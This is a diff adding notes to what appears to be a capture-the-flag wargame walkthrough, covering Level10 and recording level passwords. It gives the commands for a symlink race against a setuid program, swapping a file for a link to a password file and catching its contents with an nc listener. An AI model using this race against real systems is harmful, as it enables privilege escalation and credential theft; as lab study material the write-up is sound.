@@ -108,3 +108,15 @@ next level pass: t8JzLEZl
 
 Level10:
 ----------------
+Trigger race condition:
+touch /tmp/test
+./flag10 /tmp/test 10.215.10.77 &
+(/tmp/test is readable ==> bypass access check. Wait forconnect timeout)
+rm /tmp/test; ln -sf /home/flag10/password /tmp/test
+(replace link and start listener)
+WIN: nc -l -p 18211
+
+next level pass: UJhv5Wds
+
+Level11:
+----------------
